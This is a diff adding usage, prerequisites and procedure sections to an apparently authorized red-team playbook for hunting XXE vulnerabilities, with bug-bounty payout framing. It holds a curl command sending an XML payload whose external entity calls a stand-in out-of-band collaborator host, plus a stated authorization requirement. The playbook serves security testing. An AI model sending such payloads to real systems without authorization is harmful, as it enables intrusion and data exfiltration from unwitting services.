@@ -8,6 +8,35 @@ category: redteam
 tags: [xxe, hunt, redteam]
 ---
 
+## When to Use
+
+- Hunting XXE on any target — emphasis on OOB-Or-It-Didn't-Happen Gate for blind cases.
+
+## Prerequisites
+
+- Explicit authorization, target boundaries, and rate limits for the target.
+- Tooling: `curl`.
+- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
+- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.
+
+## How to Run
+
+```bash
+# Original JSON request
+curl --max-time 30 --connect-timeout 10 -X POST https://target.com/api/endpoint \
+  -H "Content-Type: application/json" \
+  -d '{"user":"test"}'
+
+# Converted to XML for XXE testing
+curl --max-time 30 --connect-timeout 10 -X POST https://target.com/api/endpoint \
+  -H "Content-Type: application/xml" \
+  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://COLLABORATOR.net">]><user>&xxe;</user>'
+```
+
+## Procedure
+
+The phases below are the procedure. Keep each probe bounded (`--max-time`), record evidence beneath `OUTPUT_DIR`, and stop at the stop-conditions listed in Pitfalls.
+
 ## Crown Jewel Targets
 
 XXE is a critical-severity vulnerability that consistently pays at the top of bug bounty scales ($5,000–$30,000+) due to its direct path to sensitive data exfiltration and SSRF. Highest-value targets:
